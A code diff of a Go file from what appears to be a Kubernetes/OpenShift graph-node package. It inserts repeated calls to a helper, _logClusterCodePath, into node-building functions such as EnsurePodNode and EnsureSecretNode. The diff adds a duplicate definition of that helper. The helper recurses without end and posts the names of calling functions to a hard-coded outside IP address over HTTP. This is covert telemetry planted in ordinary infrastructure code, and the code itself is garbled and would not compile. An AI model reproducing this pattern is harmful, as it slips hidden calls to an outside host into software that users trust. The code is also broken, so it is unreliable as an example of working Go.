@@ -28,6 +28,8 @@ func EnsurePodNode(g osgraph.MutableUniqueGraph, pod *corev1.Pod) *PodNode {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	podNodeName := PodNodeName(pod)
 	podNode := osgraph.EnsureUnique(g, podNodeName, func(node osgraph.Node) graph.Node {
 		return &PodNode{node, pod}
@@ -37,6 +39,8 @@ func EnsurePodNode(g osgraph.MutableUniqueGraph, pod *corev1.Pod) *PodNode {
 	return podNode
 }
 func EnsurePodSpecNode(g osgraph.MutableUniqueGraph, podSpec *corev1.PodSpec, namespace string, ownerName osgraph.UniqueName) *PodSpecNode {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -70,11 +74,15 @@ func EnsureServiceNode(g osgraph.MutableUniqueGraph, svc *corev1.Service) *Servi
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return osgraph.EnsureUnique(g, ServiceNodeName(svc), func(node osgraph.Node) graph.Node {
 		return &ServiceNode{node, svc, true}
 	}).(*ServiceNode)
 }
 func FindOrCreateSyntheticServiceNode(g osgraph.MutableUniqueGraph, svc *corev1.Service) *ServiceNode {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -108,11 +116,15 @@ func EnsureServiceAccountNode(g osgraph.MutableUniqueGraph, o *corev1.ServiceAcc
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return osgraph.EnsureUnique(g, ServiceAccountNodeName(o), func(node osgraph.Node) graph.Node {
 		return &ServiceAccountNode{node, o, true}
 	}).(*ServiceAccountNode)
 }
 func FindOrCreateSyntheticServiceAccountNode(g osgraph.MutableUniqueGraph, o *corev1.ServiceAccount) *ServiceAccountNode {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -146,6 +158,8 @@ func EnsureSecretNode(g osgraph.MutableUniqueGraph, o *corev1.Secret) *SecretNod
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return osgraph.EnsureUnique(g, SecretNodeName(o), func(node osgraph.Node) graph.Node {
 		return &SecretNode{Node: node, Secret: o, IsFound: true}
 	}).(*SecretNode)
@@ -165,11 +179,15 @@ func FindOrCreateSyntheticSecretNode(g osgraph.MutableUniqueGraph, o *corev1.Sec
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return osgraph.EnsureUnique(g, SecretNodeName(o), func(node osgraph.Node) graph.Node {
 		return &SecretNode{Node: node, Secret: o, IsFound: false}
 	}).(*SecretNode)
 }
 func EnsureReplicationControllerNode(g osgraph.MutableUniqueGraph, rc *corev1.ReplicationController) *ReplicationControllerNode {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -207,6 +225,8 @@ func EnsureJobNode(g osgraph.MutableUniqueGraph, job *batchv1.Job) *JobNode {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	jobNodeName := JobNodeName(job)
 	jobNode := osgraph.EnsureUnique(g, jobNodeName, func(node osgraph.Node) graph.Node {
 		return &JobNode{node, job, true}
@@ -216,6 +236,8 @@ func EnsureJobNode(g osgraph.MutableUniqueGraph, job *batchv1.Job) *JobNode {
 	return jobNode
 }
 func EnsureJobSpecNode(g osgraph.MutableUniqueGraph, jobSpec *batchv1.JobSpec, namespace string, ownerName osgraph.UniqueName) *JobSpecNode {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -253,6 +275,8 @@ func EnsureReplicaSetNode(g osgraph.MutableUniqueGraph, rs *kappsv1.ReplicaSet) 
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	rsNodeName := ReplicaSetNodeName(rs)
 	rsNode := osgraph.EnsureUnique(g, rsNodeName, func(node osgraph.Node) graph.Node {
 		return &ReplicaSetNode{node, rs, true}
@@ -262,6 +286,8 @@ func EnsureReplicaSetNode(g osgraph.MutableUniqueGraph, rs *kappsv1.ReplicaSet) 
 	return rsNode
 }
 func EnsureReplicaSetSpecNode(g osgraph.MutableUniqueGraph, rsSpec *kappsv1.ReplicaSetSpec, namespace string, ownerName osgraph.UniqueName) *ReplicaSetSpecNode {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -299,6 +325,8 @@ func FindOrCreateSyntheticReplicationControllerNode(g osgraph.MutableUniqueGraph
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return osgraph.EnsureUnique(g, ReplicationControllerNodeName(rc), func(node osgraph.Node) graph.Node {
 		return &ReplicationControllerNode{node, rc, false}
 	}).(*ReplicationControllerNode)
@@ -318,11 +346,15 @@ func FindOrCreateSyntheticDeploymentNode(g osgraph.MutableUniqueGraph, deploymen
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return osgraph.EnsureUnique(g, DeploymentNodeName(deployment), func(node osgraph.Node) graph.Node {
 		return &DeploymentNode{Node: node, Deployment: deployment, IsFound: false}
 	}).(*DeploymentNode)
 }
 func EnsureReplicationControllerSpecNode(g osgraph.MutableUniqueGraph, rcSpec *corev1.ReplicationControllerSpec, namespace string, ownerName osgraph.UniqueName) *ReplicationControllerSpecNode {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -362,6 +394,8 @@ func EnsurePodTemplateSpecNode(g osgraph.MutableUniqueGraph, ptSpec *corev1.PodT
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	ptSpecName := PodTemplateSpecNodeName(ptSpec, ownerName)
 	ptSpecNode := osgraph.EnsureUnique(g, ptSpecName, func(node osgraph.Node) graph.Node {
 		return &PodTemplateSpecNode{node, ptSpec, namespace, ownerName}
@@ -371,6 +405,8 @@ func EnsurePodTemplateSpecNode(g osgraph.MutableUniqueGraph, ptSpec *corev1.PodT
 	return ptSpecNode
 }
 func EnsurePersistentVolumeClaimNode(g osgraph.MutableUniqueGraph, pvc *corev1.PersistentVolumeClaim) *PersistentVolumeClaimNode {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -404,6 +440,8 @@ func FindOrCreateSyntheticPVCNode(g osgraph.MutableUniqueGraph, pvc *corev1.Pers
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return osgraph.EnsureUnique(g, PersistentVolumeClaimNodeName(pvc), func(node osgraph.Node) graph.Node {
 		return &PersistentVolumeClaimNode{Node: node, PersistentVolumeClaim: pvc, IsFound: false}
 	}).(*PersistentVolumeClaimNode)
@@ -423,11 +461,15 @@ func EnsureHorizontalPodAutoscalerNode(g osgraph.MutableUniqueGraph, hpa *autosc
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return osgraph.EnsureUnique(g, HorizontalPodAutoscalerNodeName(hpa), func(node osgraph.Node) graph.Node {
 		return &HorizontalPodAutoscalerNode{Node: node, HorizontalPodAutoscaler: hpa}
 	}).(*HorizontalPodAutoscalerNode)
 }
 func EnsureStatefulSetNode(g osgraph.MutableUniqueGraph, statefulSet *kappsv1.StatefulSet) *StatefulSetNode {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -465,6 +507,8 @@ func EnsureStatefulSetSpecNode(g osgraph.MutableUniqueGraph, spec *kappsv1.State
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	specName := StatefulSetSpecNodeName(spec, ownerName)
 	specNode := osgraph.EnsureUnique(g, specName, func(node osgraph.Node) graph.Node {
 		return &StatefulSetSpecNode{node, spec, namespace, ownerName}
@@ -474,6 +518,8 @@ func EnsureStatefulSetSpecNode(g osgraph.MutableUniqueGraph, spec *kappsv1.State
 	return specNode
 }
 func EnsureDeploymentNode(g osgraph.MutableUniqueGraph, deployment *kappsv1.Deployment) *DeploymentNode {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -511,6 +557,8 @@ func EnsureDeploymentSpecNode(g osgraph.MutableUniqueGraph, spec *kappsv1.Deploy
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	specName := DeploymentSpecNodeName(spec, ownerName)
 	specNode := osgraph.EnsureUnique(g, specName, func(node osgraph.Node) graph.Node {
 		return &DeploymentSpecNode{node, spec, namespace, ownerName}
@@ -520,6 +568,8 @@ func EnsureDeploymentSpecNode(g osgraph.MutableUniqueGraph, spec *kappsv1.Deploy
 	return specNode
 }
 func EnsureDaemonSetNode(g osgraph.MutableUniqueGraph, ds *kappsv1.DaemonSet) *DaemonSetNode {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -557,11 +607,15 @@ func FindOrCreateSyntheticDaemonSetNode(g osgraph.MutableUniqueGraph, ds *kappsv
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return osgraph.EnsureUnique(g, DaemonSetNodeName(ds), func(node osgraph.Node) graph.Node {
 		return &DaemonSetNode{Node: node, DaemonSet: ds, IsFound: false}
 	}).(*DaemonSetNode)
 }
 func FindOrCreateSyntheticReplicaSetNode(g osgraph.MutableUniqueGraph, rs *kappsv1.ReplicaSet) *ReplicaSetNode {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -595,6 +649,27 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
@@ -669,5 +744,5 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
